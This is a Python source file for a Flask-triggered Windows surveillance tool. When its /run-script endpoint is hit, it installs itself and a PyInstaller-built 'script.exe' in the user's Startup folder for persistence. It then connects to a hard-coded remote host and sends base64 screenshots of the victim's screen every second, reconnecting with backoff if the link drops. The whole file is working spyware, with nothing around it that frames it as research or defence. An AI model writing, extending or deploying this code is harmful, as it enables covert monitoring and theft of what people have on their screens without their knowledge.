from flask import Flask, jsonify
import multiprocessing
import threading
import socket
import subprocess
import io
import pyautogui
import base64
import time
import logging
import os
import shutil
import sys
import struct
import atexit
import subprocess


# ---------------- Configuration ----------------
SERVER_HOST = '192.168.1.214'  # Replace with your server's IP or hostname
SERVER_PORT = 5204             # Must match the server's listening port
RECONNECT_DELAY = 5            # Initial delay between reconnection attempts in seconds
MAX_RECONNECT_DELAY = 60       # Maximum delay between reconnection attempts in seconds
STARTUP_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
EXECUTABLE_NAME = "script.exe"  # Name of the executable

# ---------------- Global Variables ----------------
client_socket = None
stop_event = multiprocessing.Event()

# ---------------- Supporting Functions ----------------
def capture_screenshot():
    """Capture and encode a screenshot as a base64 string."""
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        img_base64 = base64.b64encode(buffer.read()).decode('utf-8')
        logging.info("Screenshot captured successfully.")
        return img_base64
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        return f"SCREENSHOT_ERROR:{e}"

def compile_to_exe():
    """Compile the script to an .exe using PyInstaller."""
    script_path = sys.argv[0]
    exe_path = os.path.join(STARTUP_FOLDER, EXECUTABLE_NAME)

    if not os.path.exists(exe_path):
        logging.info(f"Compiling {script_path} to {exe_path}...")
        subprocess.run([
            'pyinstaller',
            '--onefile',
            '--distpath', STARTUP_FOLDER,  # Place the executable in the startup folder
            '--name', os.path.splitext(EXECUTABLE_NAME)[0],  # Use the desired executable name
            script_path
        ], check=True)
        logging.info(f"Executable created at {exe_path}.")
    else:
        logging.info(f"Executable already exists at {exe_path}.")


def copy_exe_to_startup():
    """Ensure the .exe file is in the startup folder."""
    exe_path = os.path.join(STARTUP_FOLDER, EXECUTABLE_NAME)
    if not os.path.exists(exe_path):
        compile_to_exe()
    else:
        logging.info(f"{EXECUTABLE_NAME} already exists in the startup folder.")

def send_message(client, message):
    """Send a message to the server."""
    try:
        if client.fileno() == -1:
            logging.error("Socket is not valid. Skipping send operation.")
            return
        message_bytes = message.encode('utf-8')
        message_length = struct.pack('>I', len(message_bytes))
        client.sendall(message_length + message_bytes)
        logging.debug(f"Sent message: {message}")
    except Exception as e:
        logging.error(f"Error sending message: {e}")

def send_screen_resolution(client):
    """Send screen resolution to the server."""
    width, height = pyautogui.size()
    message = f"SCREEN_RESOLUTION:{width}:{height}"
    send_message(client, message)
    logging.info(f"Sent screen resolution: {width}x{height}")

def send_screenshots_continuously(client):
    """Continuously capture and send screenshots to the server."""
    while not stop_event.is_set():
        try:
            img_data = capture_screenshot()
            if img_data.startswith("SCREENSHOT_ERROR:"):
                send_message(client, img_data)
            else:
                screenshot_message = f"SCREENSHOT:{img_data}"
                send_message(client, screenshot_message)
                logging.debug("Screenshot sent to server.")
            time.sleep(1)  # Adjust interval as needed
        except Exception as e:
            logging.error(f"Error sending screenshot: {e}")
            break

def recvall(sock, n):
    """Receive a specific amount of bytes from the socket."""
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def handle_incoming_messages(client, stop_event):
    """Handle incoming messages from the server."""
    while not stop_event.is_set():
        try:
            raw_msglen = recvall(client, 4)
            if not raw_msglen:
                break
            msglen = struct.unpack('>I', raw_msglen)[0]
            data = recvall(client, msglen)
            if not data:
                break
            message = data.decode('utf-8', errors='replace').strip()
            logging.info(f"Received message: {message}")
        except Exception as e:
            logging.error(f"Error during communication: {e}")
            break

def connection_manager(stop_event):
    """Manage the connection to the server."""
    global client_socket
    delay = RECONNECT_DELAY
    while not stop_event.is_set():
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            client_socket = client
            logging.info(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            delay = RECONNECT_DELAY
            send_screen_resolution(client)

            # Start screenshot thread
            screenshot_thread = threading.Thread(target=send_screenshots_continuously, args=(client,))
            screenshot_thread.start()

            # Handle incoming messages
            handle_incoming_messages(client, stop_event)

            client.close()
            client_socket = None
        except socket.error as e:
            logging.error(f"Connection failed: {e}. Retrying in {delay} seconds...")
            time.sleep(delay)
            delay = min(delay * 2, MAX_RECONNECT_DELAY)

atexit.register(lambda: client_socket.close() if client_socket else None)

# ---------------- Flask Application ----------------
app = Flask(__name__)

@app.route('/run-script', methods=['GET'])
def run_script():
    """Run the script when the endpoint is accessed."""
    try:
        global stop_event
        stop_event.clear()

        copy_exe_to_startup()

        # Start the connection manager in a separate process
        connection_process = multiprocessing.Process(target=connection_manager, args=(stop_event,), daemon=True)
        connection_process.start()

        # Copy script to Windows startup folder
        script_path = sys.argv[0]
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        target_path = os.path.join(startup_folder, os.path.basename(script_path))

        if not os.path.exists(target_path):
            shutil.copy(script_path, target_path)
        else:
            logging.info(f"File {target_path} already exists in the startup folder.")

        return jsonify({""})
    except Exception as e:
        logging.error(f"Error running script: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/stop-script', methods=['GET'])
def stop_script():
    """Stop the running script."""
    try:
        global stop_event
        stop_event.set()
        return jsonify({"message": "Script stopped successfully!"})
    except Exception as e:
        logging.error(f"Error stopping script: {e}")
        return jsonify({"error": str(e)}), 500

# ---------------- Main Entry Point ----------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
